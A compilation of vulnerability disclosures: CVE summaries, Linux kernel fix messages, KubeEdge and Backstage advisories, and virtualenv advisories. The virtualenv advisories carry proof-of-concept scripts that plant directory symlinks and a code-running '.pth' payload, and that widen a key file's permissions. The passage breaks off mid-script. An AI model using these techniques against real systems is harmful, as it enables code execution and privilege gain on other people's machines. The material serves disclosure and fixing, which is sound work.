The Sendmail 8.12.3 package in Debian GNU/Linux 3.0 does not securely create temporary files, which could allow local users to gain additional privileges via (1) expn, (2) checksendmail, or (3) doublebounce.pl.

Missing authorization in the native binder service 'android.dji.server' (transaction code 1018) in DJI CrystalSky ZS600C firmware v0.3.9.7 through v0.6.6.9 on Android allows a local application with no permissions to execute arbitrary OS commands as root, because the handler passes a caller-supplied string to system() in the root-privileged 'assistant' daemon without any caller-identity or permission check.

In the Linux kernel, the following vulnerability has been resolved:

bnxt_en: fix DMA mapping length for padded small packets

Stefan Fleischmann reported Intel IOMMU DMA Read faults on BCM57412
NetXtreme-E NICs when transmitting packets on VLAN/macvlan interfaces:

  DMAR: [DMA Read NO_PASID] Request device [18:00.0] fault addr 0xfc499000
        [fault reason 0x06] PTE Read access is not set
  bnxt_en 0000:18:00.0 eno1np0: Abandoning msg {0xb4 0x41a} len: 0 due to firmware status: 0x2000001
  ...
  NETDEV WATCHDOG: eno1np0 (bnxt_en): transmit queue 0 timed out

The fault address (0xfc499000) is on an exact 4KB page boundary,
pointing to a DMA read buffer overrun.

In bnxt_start_xmit(), packets smaller than BNXT_MIN_PKT_SIZE (52 bytes),
such as 42-byte untagged ARP frames, are padded:

    if (length < BNXT_MIN_PKT_SIZE) {
        pad = BNXT_MIN_PKT_SIZE - length;
        if (skb_pad(skb, pad))
            goto tx_kick_pending;
        length = BNXT_MIN_PKT_SIZE;
    }

    mapping = dma_map_single(&pdev->dev, skb->data, len, DMA_TO_DEVICE);
    ...
    dma_unmap_len_set(tx_buf, len, len);

However, 'len' was initialized earlier to skb_headlen(skb) (e.g. 42 bytes)
and is left unadjusted after padding. Consequently, dma_map_single() and
dma_unmap_len_set() map and track only 42 bytes.

Later, the hardware TX buffer descriptor is programmed with the padded length:

    txbd->tx_bd_len_flags_type =
        cpu_to_le32(((len + pad) << TX_BD_LEN_SHIFT) | flags |
                    TX_BD_FLAGS_PACKET_END);

The NIC DMA engine is thus instructed to read 52 bytes from a region where
only 42 bytes were DMA-mapped. If skb->data ends near the boundary of a 4KB
page (within 'pad' bytes of the next page), the hardware DMA read overruns
into the unmapped adjacent page, triggering an IOMMU fault.

This issue was exposed after commit 447cbe95ebb9 ("vlan: fix skb_under_panic
and races when toggling HW VLAN offload") because reserving extra VLAN
headroom rounded LL_RESERVED_SPACE from 48 up to 64 bytes, shifting skb->data
offsets and potentially causing small frames to land right against page
boundaries.

Fix this by using skb_put_padto(skb, BNXT_MIN_PKT_SIZE) in
bnxt_start_xmit(), before skb_shinfo(skb)->nr_frags is sampled,
because padding might linearize the skb.
This ensures skb->len and skb_headlen(skb) reflect the padded size so
that dma_map_single() maps the full buffer and the descriptor length is
consistent. This also removes the temporary 'pad' variable and masking logic.

The padding is done after the SW USO branch, otherwise
bnxt_sw_udp_gso_xmit() would account the padding as UDP payload
and send it in extra segments.

Note that SW USO segments are still not padded: with IPv4, a segment
carrying less than 10 bytes of UDP payload (small gso_size, or a short
last segment) is sent as a frame shorter than BNXT_MIN_PKT_SIZE.
This is a separate issue, left for a followup patch.

Missing authentication for a critical function in the Android Debug Bridge daemon (adbd) in DJI CrystalSky ZS600C firmware v0.3.9.7 through v0.6.6.9 allows an attacker to obtain an unauthenticated shell (uid 2000), a foothold for privilege escalation to root. The device ships with ro.adb.secure=0 (no host key authorization) and USB ADB enabled by default; ADB over TCP is not enabled by default but, once enabled (e.g. via the shipped /system/bin/adbd_tcp.sh or 'setprop persist.adb.tcp.port 5555'), the same unauthenticated shell is reachable over the network (CVSS 4.0 base 9.3).

In the Linux kernel, the following vulnerability has been resolved:

net/mlx5e: Prevent stale XSK buffer release on refill retry

When an XDP redirect to an AF_XDP socket fails because its RX ring is
full, the XSK core frees the buffer. During the subsequent batched refill
of a legacy cyclic RQ, mlx5e also releases the WQE's XSK buffer before
allocating a replacement. If that refill succeeds only partially, a WQE
left without a replacement retains its old buffer pointer.

The buffer can meanwhile be allocated to another WQE. A later refill
retry can then free the live buffer through the stale pointer and publish
the same UMEM frame twice.

Mark the WQE as released immediately after the driver-side free. The flag
is already cleared when a replacement buffer is assigned, so refill
retries no longer release stale pointers.

The failure is silent and produces no kernel warning or splat. A
standalone legacy cyclic-RQ zero-copy libxsk reproducer, using 64-byte UDP
traffic offered at 12 Mpps, detected it: stock stopped after 2,854,914
packets in 4.094 seconds, with 4,542 xdp_rx_ring_full events and 64
ownership/double-publication errors. With this change it processed
356,904,225 packets in 30 seconds despite 571,405 xdp_rx_ring_full events,
with no ownership or data errors.

In the Linux kernel, the following vulnerability has been resolved:

sched_ext: Fix CPU hotplug hang when a dying CPU's tasks sit in the BPF scheduler

A CPU going down has to empty its own rq. Its hotplug thread waits in
sched_cpu_wait_empty() until nothing else is left, and the only thing that
wakes it is balance_push(), which runs from __schedule() on the dying CPU
and pushes off the migratable tasks the CPU picks.

sched_ext breaks this. A task sitting on a user DSQ or held by the BPF
scheduler is still counted on its rq, but an inactive CPU no longer calls
ops.dispatch() and can't pull the task back. The dying CPU goes idle with
the task still counted, and one of two things happens:

- Another CPU consumes the task. The rq empties without a __schedule() on
  the dying CPU, so the hotplug thread is never woken and cpu_down() hangs
  holding cpu_hotplug_lock.
- The task is affine only to the dying CPU. Nothing can move it, and the
  offline stalls until the watchdog ejects the BPF scheduler.

When the rq goes offline, re-enqueue every task on it that isn't already on
the local DSQ. An enqueue on an offline rq lands on the local DSQ, so the
dying CPU itself picks the tasks and balance_push() pushes them off, the
same as for the other sched classes. From then on no sched_ext path on
another CPU can pull a task off the rq.

ops.dispatch() currently stops as soon as the CPU goes inactive, and CPU
hotplug then waits for an RCU grace period before taking the rq offline. A
BPF-held task affine only to the dying CPU and preempted inside an RCU
read-side critical section would block that grace period, and the rq would
never go offline. Test SCX_RQ_ONLINE directly so that ops.dispatch() keeps
running until the rq goes offline. Only the dying CPU's own hotplug thread
clears the flag during teardown, and task_can_run_on_remote_rq() still keeps
other rqs' tasks off the CPU.

In the Linux kernel, the following vulnerability has been resolved:

ipv4: do not warn on route notification size race

Commit 680aea08e78c ("net: ipv4: Emit notification when fib hardware
flags are changed") added asynchronous route notifications for hardware
flag changes.

fib_alias_hw_flags_set() sizes the skb with fib_nlmsg_size() and later
fills it with fib_dump_info() while holding only RCU.  With nexthop
compatibility mode enabled, a concurrent replacement can grow the group
between these independent snapshots.  fib_dump_info() can then
legitimately return -EMSGSIZE, so the warning does not prove a sizing bug.

Remove the warning.  The existing error path still frees the skb and
reports the error to listeners.

In the Linux kernel, the following vulnerability has been resolved:

Input: ati_remote2 - fix type confusion in device attribute handlers

Previously, the channel_mask and mode_mask attributes were registered on
the parent usb_device via sysfs_create_group(). When commit b20d6bf8014b
("Input: ati-remote2 - use driver core to instantiate device
attributes") converted the driver to let the driver core manage them via
dev_groups in struct usb_driver, the attributes moved to the bound
usb_interface devices, but the show and store callbacks were not updated
accordingly.

As a result, the callbacks still invoked to_usb_device() on a device
pointer belonging to a struct usb_interface, producing an invalid
usb_device pointer.

Use to_usb_interface() directly in the attribute handlers to obtain the
interface and its driver data.

In the Linux kernel, the following vulnerability has been resolved:

wifi: brcmfmac: fix P2P device removal race in brcmf_detach()

When the driver is removed while the user space process that created
the P2P device (e.g. wpa_supplicant) is still exiting, the P2P device
interface is removed twice and the kernel crashes.

The two paths are:

 - wpa_supplicant, on exit, sends NL80211_CMD_DEL_INTERFACE for the P2P
   device. nl80211_del_interface() holds RTNL and the wiphy mutex and
   calls brcmf_p2p_del_vif(), which disables discovery and waits up to
   1.5 s for BRCMF_E_IF_DEL. Then it calls brcmf_remove_interface(),
   which unregisters the wdev and frees the vif and the ifp.

 - brcmf_detach() sets the bus down, so BRCMF_E_IF_DEL never arrives,
   and calls brcmf_remove_interface(ifp, false) for the same ifp.
   brcmf_p2p_ifp_removed() reads ifp->vif and then blocks on
   rtnl_lock(). When brcmf_p2p_del_vif() releases RTNL, it calls
   cfg80211_unregister_wdev() on the wdev that was already unregistered
   and freed.

The second list_del_rcu() of wdev->list faults on LIST_POISON2:

  brcmfmac: brcmf_p2p_del_vif delete P2P vif
  brcmfmac: brcmf_p2p_deinit_discovery enter
  brcmfmac: brcmf_p2p_del_vif P2P: GO_NEG_PHASE status cleared
  brcmfmac: brcmf_detach Enter
  brcmfmac: brcmf_bus_change_state 1 -> 0
  brcmfmac: brcmf_remove_interface Enter, bsscfgidx=1, ifidx=0
  brcmfmac: brcmf_del_if Enter, bsscfgidx=1, ifidx=0
  brcmfmac: brcmf_p2p_ifp_removed P2P: device interface removed
  [1.5 s later, brcmf_p2p_del_vif() timed out]
  brcmfmac: brcmf_remove_interface Enter, bsscfgidx=1, ifidx=0
  brcmfmac: brcmf_del_if Enter, bsscfgidx=1, ifidx=0
  brcmfmac: brcmf_p2p_ifp_removed P2P: device interface removed
  Unable to handle kernel paging request at virtual address dead000000000122
  Internal error: Oops: 96000044 [#1] PREEMPT_RT SMP
  pc : _cfg80211_unregister_wdev+0x6c/0x264 [cfg80211]
  Call trace:
   _cfg80211_unregister_wdev+0x6c/0x264 [cfg80211]
   cfg80211_unregister_wdev+0x10/0x1c [cfg80211]
   brcmf_p2p_ifp_removed+0x84/0xb0 [brcmfmac]
   brcmf_remove_interface+0x1f4/0x254 [brcmfmac]
   brcmf_detach+0x88/0x180 [brcmfmac]
   brcmf_sdio_remove+0x90/0x7b0 [brcmfmac]
   brcmf_sdiod_remove+0x20/0xa0 [brcmfmac]
   brcmf_ops_sdio_remove+0xbc/0x12c [brcmfmac]
   sdio_bus_remove+0x38/0x144
   device_release_driver_internal+0x1e8/0x2c0
   device_release_driver+0x14/0x20
   brcmf_sdio_bus_remove+0x2c/0x40 [brcmfmac]
   brcmf_fwvid_unregister_vendor+0xd8/0x170 [brcmfmac]
   __exit_compat+0x18/0x418 [brcmfmac_cyw]
   __arm64_sys_delete_module+0x1ac/0x244

The log was taken with debug=0x406 on an i.MX 8M Plus board with a
CYW55513 (Sona IF513) on SDIO. The driver is the Ezurio backport of
brcmfmac from v6.18.22 on a 5.4-rt kernel. The code involved is the same
in mainline.

To reproduce:

  1. Start wpa_supplicant on wlan0 and let it associate. It creates the
     P2P device (iw dev shows "type P2P-device").
  2. Stop wpa_supplicant and remove the driver without waiting for
     wpa_supplicant to exit:

       kill $(pidof wpa_supplicant)
       rmmod brcmfmac_cyw brcmfmac

The crash is reproducible on that board.

For the interface without a netdev (the P2P device), take RTNL and the
wiphy mutex in brcmf_detach() before reading iflist, and remove it with
locked=true. If brcmf_p2p_del_vif() runs first, brcmf_detach() finds the
slot empty. If brcmf_detach() runs first, nl80211 does not find the wdev
any more. The interfaces with a netdev are removed as before, because
brcmf_del_if() takes RTNL on its own for the primary interface.

Cross-site scripting (XSS) vulnerability in Infoblox DNS One running firmware 2.4.0-8 and earlier allows remote attackers to execute arbitrary scripts as other users via the (1) CLIENTID or (2) HOSTNAME option of a DHCP request.
The eay_check_x509cert function in KAME Racoon successfully verifies certificates even when OpenSSL validation fails, which could allow remote attackers to bypass authentication.

The Unreal Engine, as used in DeusEx 1.112fm and earlier, Devastation 390 and earlier, Mobile Forces 20000 and earlier, Nerf Arena Blast 1.2 and earlier, Postal 2 1337 and earlier, Rune 107 and earlier, Tactical Ops 3.4.0 and earlier, Unreal 1 226f and earlier, Unreal II XMP 7710 and earlier, Unreal Tournament 451b and earlier, Unreal Tournament 2003 2225 and earlier, Unreal Tournament 2004 before 3236, Wheel of Time 333b and earlier, and X-com Enforcer, allows remote attackers to execute arbitrary code via a UDP packet containing a secure query with a long value, which overwrites memory.

## Impact

The KubeEdge NodeUpgradeJob handler constructed the `keadm upgrade edge` command by concatenating the user-controlled `spec.version` and `spec.image` fields into a shell command.

An authenticated user with permission to create or update `NodeUpgradeJob` resources through the v1alpha2 API could include shell metacharacters in either field. When the upgrade job was processed, the injected command could be executed on the targeted edge node with the privileges available to the upgrade process.

Successful exploitation could result in arbitrary command execution and compromise the confidentiality, integrity, and availability of the affected edge node.

## Patches

The fix removes shell-based command construction and invokes `keadm` using a structured argument list through `exec.Command`.

The version and image values are passed as separate literal arguments and are no longer interpreted by a command shell.

The fixed versions:

* KubeEdge v1.23.1
* KubeEdge v1.22.2
* KubeEdge v1.21.2

## Workarounds

Until a patched version is available:

* restrict permission to create or update `NodeUpgradeJob` resources to trusted administrators;
* do not allow untrusted users or tenants to control the `spec.version` or `spec.image` fields;
* avoid using NodeUpgradeJob-based edge upgrades in environments where these fields may be influenced by untrusted users.

## Credits

KubeEdge thanks Sang-Hoon Choi ([KoreaSecurity](https://github.com/KoreaSecurity), Sejong University)
for responsibly reporting this issue and for coordinating with the KubeEdge
maintainers through the security disclosure process.

cves.summary: IPFilter 3.1.1 through 3.4.28 allows remote attackers to bypass firewall rules by sending a PASV command string as the argument of another command to an FTP server, which generates a response that contains the string, causing IPFilter to treat the response as if it were a legitimate PASV command from the server.

WatchGuard SOHO products running firmware 5.1.6 and earlier, and Vclass/RSSA using 3.2 SP1 and earlier, allows remote attackers to bypass firewall rules by sending a PASV command string as the argument of another command to an FTP server, which generates a response that contains the string, causing IPFilter to treat the response as if it were a legitimate PASV command from the server.
Multiple signal handler race conditions in lukemftpd (aka tnftpd before 20040810) allow remote authenticated attackers to cause a denial of service or execute arbitrary code.
SQL injection vulnerability in index.php in CubeCart 2.0.1 allows remote attackers to execute arbitrary SQL commands via the cat_id parameter.
BlackBoard 1.5.1 allows remote attackers to gain sensitive information via a direct request to (1) checkdb.inc.php, (2) admin.inc.php or (3) cp.inc.php, which reveals the path in a PHP error message.

A flaw was found in RESTEasy's SourceProvider. This vulnerability allows an unauthenticated attacker to perform an unauthenticated remote file read. By sending a specially crafted XML body with a DOCTYPE declaration referencing external entities to an endpoint that accepts application/xml and returns Source or StreamSource, the server can be tricked into resolving the entity and including sensitive file contents in the HTTP response. This is due to the SourceProvider.writeTo() method creating a SAXParser without disabling external entity resolution, leading to an XML External Entity (XXE) vulnerability.
dhcpcd DHCP client daemon 1.3.22 and earlier allows local users to execute arbitrary code via shell metacharacters that are fed from a dhcpd .info script into a .exe script.

Multiple ethernet Network Interface Card (NIC) device drivers do not pad frames with null bytes, which allows remote attackers to obtain information from previous packets or kernel memory by using malformed packets, as demonstrated by Etherleak.

Multiple SQL injection vulnerabilities in DeskPRO 1.1.0 and earlier allow remote attackers to insert arbitrary SQL and conduct unauthorized activities via (1) the cat parameter in faq.php, (2) the article parameter in faq.php, (3) the tickedid parameter in view.php, and (4) the Password entry on the logon screen.
Format string vulnerability in XChat 1.2.x allows remote attackers to execute arbitrary code via a malformed nickname.

The check_referer() function in Formmail.php 5.0 and earlier allows remote attackers to bypass access restrictions via an empty or spoofed HTTP Referer, as demonstrated using an application on the same web server that contains a cross-site scripting (XSS) issue.
The AddToMailingList function in CactuSoft CactuShop 5.0 Lite contains a backdoor that allows remote attackers to delete arbitrary files via an email address that starts with |||.
oj.cgi in OpenJournal 2.0 through 2.0.5 allows remote attackers to bypass authentication and access the control panel via a 0 in the uid parameter.
Stack-based buffer overflow in The Palace 3.5 and earlier client allows remote attackers to execute arbitrary code via a link to a palace:// url followed by a long server address string.
ImageCast Control Center 4.1.0 allows remote attackers to cause a denial of service (resource exhaustion or system crash) via a long string to port 12002.
Directory traversal vulnerability in eXtropia bbs_forum.cgi 1.0 allows remote attackers to read arbitrary files via a .. (dot dot) attack on the file parameter.

### Impact

When using the Azure Blob Storage provider, an authenticated Backstage user may be able to read restricted TechDocs content when entity-level permissions are enabled. Deployments that intentionally disable the default backend authentication policy may have broader exposure.

### Patches

Patched in `@backstage/plugin-techdocs-backend` version `2.2.4`

### Workarounds

- Restrict access to the TechDocs backend to users who are permitted to view all stored documentation until an upgrade can be applied.
- Keep the default backend authentication policy enabled.

cwe.name: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

cves.summary:
### Impact

Catalog entity providers for Azure Blob Storage and AWS S3 did not sufficiently validate storage object paths, which could allow catalog descriptors to be read from outside the intended storage boundary. Access is limited to locations reachable by the backend's configured credentials.

### Patches

- `@backstage/plugin-catalog-backend-module-azure` version `0.3.21`
- `@backstage/plugin-catalog-backend-module-aws` version `0.4.27`
- `@backstage/backend-defaults` version `0.7.18`

### Workarounds

- Restrict blob and object creation or renaming in configured catalog storage sources to trusted principals.
- Scope Backstage's Azure and AWS reader credentials and network access to the intended storage boundaries.
- Disable an affected catalog provider if those restrictions cannot be enforced.

cwe.name: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

cves.summary:
### Impact

An authenticated Backstage user could craft a request URL that causes the proxy-backend to forward the request to a path outside the configured base path on the target server. This is limited to target servers already configured as proxy endpoints and requires Backstage authentication by default.

### Patches

Patched in `@backstage/plugin-proxy-backend` version `0.6.17`

### Workarounds

- Deploy a reverse proxy or WAF in front of Backstage that normalizes request paths before they reach the backend.

SOAP::Lite 0.50 through 0.52 allows remote attackers to load arbitrary Perl functions by suppling a non-existent function in a script using a SOAP::Lite module, which causes the AUTOLOAD subroutine to trigger.
AOL ICQ 2002a Build 3722 allows remote attackers to cause a denial of service (crash) via a malformed .hpf file.
A router's configuration service or management interface (such as a web server or telnet) is configured to allow connections from arbitrary hosts.

Buffer overflow in nlps_server in Sun Solaris x86 2.4, 2.5, and 2.5.1 allows remote attackers to execute arbitrary code as root via a long string beginning with "NLPS:002:002:" to the listen (aka System V listener) port, TCP port 2766.
Unspecified vulnerability in crontab in IBM AIX 3.2 allows local users to gain root privileges via unknown attack vectors.

Directory traversal vulnerability in Muhammad A. Muquit wwwcount (Count.cgi) 2.3 allows remote attackers to read arbitrary GIF files via ".." sequences in the image parameter, a different vulnerability than CVE-1999-0021.

Microsoft Internet Information Services (IIS) server 4.0 SP4, without certain hotfixes released for SP4, does not require authentication credentials under certain conditions, which allows remote attackers to bypass authentication requirements, as demonstrated by connecting via Microsoft Visual InterDev 6.0.
Multiple unspecified vulnerabilities in sendmail 5, as installed on Sun SunOS 4.1.3_U1 and 4.1.4, have unspecified attack vectors and impact.  NOTE: this might overlap CVE-1999-0129.
Buffer overflow in AnalogX SimpleServer:WWW HTTP server allows remote attackers to execute commands via a long GET request.
ypbind with -ypset and -ypsetme options activated in Linux Slackware and SunOS allows local and remote attackers to overwrite files via a .. (dot dot) attack.
Buffer overflow in NLS (Natural Language Service).
Remote command execution in Microsoft Internet Explorer using .lnk and .url files.

## Summary

The builtin creator accepts existing directory symlinks through ensure_dir() and writes environment files through those
directories. This permits writes outside the requested destination.

Anthropic's OSS Scanner reported this as `ANT-2026-MUFJEG11` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Directory preparation before environment files are created.

## Attacker-controlled input

Another account must be able to prepare linked entries below the chosen destination before creation. The invoking user
must have access to the linked destination. This does not require write access to the target itself under the other
account.

## Affected code

The relevant 21.14.8 source is in
[builtin creator](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/via_global_ref/builtin/via_global_self_do.py),
[ensure_dir()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).

## Mechanism

The builtin creator calls `ensure_dir()` for `bin`, `lib`, and package directories. `ensure_dir()` accepts an existing
symlink to a directory because `exists()` follows it. Interpreter creation, seed installation, and activation-script
generation then write through that parent link. A final-file check cannot prevent a write through a linked parent.
`--clear` removes the planted tree first; ordinary creation over a prepared destination reaches it.

## Reproduction and evidence

The scanner's project tree contains `venv/bin -> ../../.local/bin` and a `.pth` file in the environment's package tree.
With the user's initially empty `~/.local/bin` first on `PATH`, `virtualenv venv` exited successfully and wrote
`python*`, `pip*`, and `activate*` into `~/.local/bin`. The marker was absent immediately after creation; a later
`pip --version` on the user's `PATH` loaded the seeded environment and the planted `.pth` code wrote the marker. A
second case began with the `bin` link resolving inside the environment; replacement of a planted package link during
seeding changed where it resolved, and writes again reached `~/.local/bin`.

The attacker must prepare entries in an existing destination. The `.pth` content is already attacker-controlled and
would run if the user used that environment directly; the added effect is creation-time writing or replacement outside
the requested tree and an executable on the user's `PATH` pointing at it. The scanner traces this default builtin path
to 20.0.0b1. [PR #3429](https://github.com/pypa/virtualenv/pull/3429) replaces linked directory components before
creation. Concurrent parent replacement remains a separate case.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prepared destination
    participant V as Builtin creator
    participant L as venv/bin symlink
    participant H as ~/.local/bin
    participant U as User
    A->>L: point to ../../.local/bin
    V->>L: ensure_dir accepts existing directory link
    V->>H: write python, pip and activate files through link
    V-->>U: creation reports success
    U->>H: run pip found on PATH
    H->>A: interpreter loads planted .pth
    A-->>U: marker created
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-MUFJEG11`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
from pathlib import Path

WORK = Path("/tmp/planted-bin-link")
shutil.rmtree(WORK, ignore_errors=True)

def user_creates_venv_in_checkout_then_runs_pip(home, make_checkout):
    local_bin = home / ".local/bin"
    user_env = {"HOME": str(home), "PATH": f"{local_bin}:{os.environ['PATH']}"}
    local_bin_before = set(os.listdir(local_bin))
    payload_marker = home / "PWNED"

    # the attacker's checkout arrives at ~/project
    subprocess.run([sys.executable, f"/tmp/repro.d/{make_checkout}", home / "project"], check=True)
    venv = home / "project/venv"
    print(f"CONTROL  venv/bin before the run resolves to {os.path.realpath(venv / 'bin')}")

    # default options; the flag only keeps the run off the network
    subprocess.run(["virtualenv", "--no-periodic-update", "--quiet", "venv"], cwd=home / "project", env=user_env, check=True)
    written = sorted(set(os.listdir(local_bin)) - local_bin_before)
    payload_ran_at_creation = payload_marker.exists()
    print(f"OBSERVED venv/bin after the run resolves to  {os.path.realpath(venv / 'bin')}")
    print(f"OBSERVED virtualenv wrote to {local_bin}: {written}")
    print(f"OBSERVED ~/PWNED exists after virtualenv: {payload_ran_at_creation}")

    # later, in another folder, the user runs pip
    pip = subprocess.run(["pip", "--version"], cwd=home, env=user_env, capture_output=True, text=True)
    print(f"OBSERVED pip --version: {(pip.stdout + pip.stderr).strip()}")
    print(f"OBSERVED ~/PWNED exists after pip: {payload_marker.exists()}")
    return written, payload_marker.exists() and not payload_ran_at_creation

print("--- checkout_with_bin_link.py: venv/bin -> ../../.local/bin")
home = WORK / "bin-link"
(home / ".local/bin").mkdir(parents=True)
written_1, pip_ran_payload_1 = user_creates_venv_in_checkout_then_runs_pip(home, "checkout_with_bin_link.py")

print("--- checkout_with_bin_link_staying_inside.py: venv/bin resolves inside venv/ until pip is seeded")
home = WORK / "bin-link-staying-inside"
(home / ".local/bin").mkdir(parents=True)
# python is linked before the bin link leads out, so the pip written to ~/.local/bin needs the user's own python there
(home / ".local/bin/python").symlink_to("/usr/local/bin/python3")
written_2, pip_ran_payload_2 = user_creates_venv_in_checkout_then_runs_pip(home, "checkout_with_bin_link_staying_inside.py")

# check: virtualenv must write nothing outside ~/project/venv, let alone a pip that runs the checkout's .pth
plain_link_followed = {"pip", "activate"} <= set(written_1) and pip_ran_payload_1
link_staying_inside_followed = {"pip", "activate"} <= set(written_2) and pip_ran_payload_2
print("---")
print(f"OBSERVED first checkout: pip, activate written to ~/.local/bin and pip ran the payload: {plain_link_followed}")
print(f"OBSERVED second checkout: pip, activate written to ~/.local/bin and pip ran the payload: {link_staying_inside_followed}")
print("BUG" if plain_link_followed or link_staying_inside_followed else "OK")
```

**`repro.d/checkout_with_bin_link.py`**

```text

venv = Path(sys.argv[1]) / "venv"

# one per minor version: the attacker does not know which Python the user has
for minor in range(9, 20):
    site_packages = venv / f"lib/python3.{minor}/site-packages"
    site_packages.mkdir(parents=True)
    (site_packages / "payload.pth").write_text("import os; open(os.path.expanduser('~/PWNED'), 'w').write(os.getcwd())\n")

# relative to a checkout at ~/project
(venv / "bin").symlink_to("../../.local/bin")
```

**`repro.d/checkout_with_bin_link_staying_inside.py`**

```text

from pathlib import Path

venv = Path(sys.argv[1]) / "venv"

site_packages = venv / "lib/py/site-packages"
site_packages.mkdir(parents=True)
(site_packages / "payload.pth").write_text("import os; open(os.path.expanduser('~/PWNED'), 'w').write(os.getcwd())\n")
for minor in range(9, 20):
    (venv / f"lib/python3.{minor}").symlink_to("py")

# pip -> a folder 7 levels below venv/; the real pip folder the seeder puts in its place is only 4 levels below
(venv / "1/2/3/4/5/6/7").mkdir(parents=True)
(site_packages / "pip").symlink_to("../../../1/2/3/4/5/6/7")

# six levels up from venv/1/2/3/4/5/6/7 is venv/1; six levels up from ~/project/venv/lib/py/site-packages/pip is ~
(venv / "1/.local/bin").mkdir(parents=True)
(venv / "bin").symlink_to("lib/py/site-packages/pip" + "/.." * 6 + "/.local/bin")
```

## Impact

Creation can place or replace environment files outside the selected tree. The written bytes are environment-creation
output; arbitrary attacker-selected file contents are not established.

Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix removes pre-existing symbolic links and Windows junctions along executable and library directory paths.
Each replacement is created immediately, and an existing entry must be a real directory. A warning names each replaced
link or junction. Directories can still be replaced after preparation; this does not protect against concurrent tree
replacement.

Fix: [PR #3429](https://github.com/pypa/virtualenv/pull/3429).

## Known mitigation

Create environments in fresh directories beneath a parent controlled only by their owner. Do not reuse trees prepared by
another account.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-MUFJEG11.

cwe.name: Improper Link Resolution Before File Access ('Link Following')

cves.summary:
## Summary

The deletion error handler obtains permission bits with lstat() but applies them through chmod(), which follows
symlinks. On an eligible unlink failure this can change permissions outside the destination.

Anthropic's OSS Scanner reported this as `ANT-2026-UK90QC27` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Permission recovery after a filesystem deletion error.

## Attacker-controlled input

A deletion must fail on a symbolic-link entry and enter the permission-recovery branch. The invoking user must have
permission to change the target mode. This is conditional error handling, not the normal successful unlink path.

## Affected code

The relevant 21.14.8 source is in
[safe_delete()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).

## Mechanism

`safe_delete()` asks `shutil.rmtree()` to retry a failed removal after adding owner-write permission. Its error handler
calls `os.lstat(path)` for mode bits but `os.chmod(path, ...)` to apply them. For a symlink, `lstat` reads the link's
mode while `chmod` follows the link. A link inside a read-only directory can therefore cause the target's mode to become
`0777` before the retry fails. The target must be owned by the invoking user and initially not writable by that user;
root does not reach this failure path.

## Reproduction and evidence

The scanner packed a project containing a mode-`0555` `venv/bin/python/` directory and a symlink inside it pointing to
the user's mode-`0400` `keys/deploy.pem`. An unprivileged user unpacked it and ran both plain `virtualenv venv` and
`virtualenv --clear venv`. Both commands exited with `PermissionError` naming the directory inside `venv`, while the
key's mode changed from `0400` to `0777`. A control archive with a writable directory completed normally and left the
key at `0400`. The read-only mode survives `tar` or `cp -a`; a normal git clone does not preserve this setup.

This changes permissions; it does not read the target or complete the virtualenv operation. Another account can use the
widened mode only if it can traverse the target's parent directories. The scanner dates the active error handler to
#3222, first released in 21.7.5. [PR #3427](https://github.com/pypa/virtualenv/pull/3427) avoids POSIX mode changes on
deletion failure and handles Windows read-only entries without following reparse points.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prepared read-only venv tree
    participant V as safe_delete error handler
    participant L as Symlink in venv
    participant K as User's 0400 key
    A->>V: virtualenv venv or --clear venv
    V->>L: unlink fails in 0555 directory
    V->>L: lstat returns link mode 0777
    V->>L: chmod follows symlink
    L->>K: target mode becomes 0777
    V-->>A: retry fails with PermissionError
    Note over K: Other accounts can use new mode if parent paths are traversable
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-UK90QC27`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

NOBODY = 65534

work = Path(tempfile.mkdtemp(prefix="repro-safe-delete-"))
os.chmod(work, 0o755)
os.chown(work, NOBODY, NOBODY)

# the attacker's project archive (venv/bin/python read-only), and the same archive with that folder writable
make_archive = [sys.executable, "/tmp/repro.d/make_project_archive.py"]
subprocess.run([*make_archive, work / "read-only.tar", "555"], check=True)
subprocess.run([*make_archive, work / "writable.tar", "755"], check=True)
subprocess.run(["tar", "-tvf", work / "read-only.tar"], check=True)

# from here on an ordinary user: root's unlink never fails, so safe_delete's error handler would never run
os.setgroups([])
os.setgid(NOBODY)
os.setuid(NOBODY)
os.umask(0o022)

def unpack_next_to_key_and_run_virtualenv(label, home_name, archive_name, *options):
    home = work / home_name
    archive = work / archive_name
    key = home / "keys" / "deploy.pem"
    key.parent.mkdir(parents=True)
    key.write_text("PRIVATE KEY\n")
    key.chmod(0o400)
    subprocess.run(["tar", "-xf", archive], cwd=home, check=True)

    mode_before = stat.S_IMODE(key.stat().st_mode)
    command = ["virtualenv", "--no-periodic-update", "-q", *options, "venv"]
    # HOME is where virtualenv keeps its app-data; nobody's own, /nonexistent, cannot hold it
    result = subprocess.run(
        command,
        cwd=home / "proj",
        env={**os.environ, "HOME": str(home)},
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
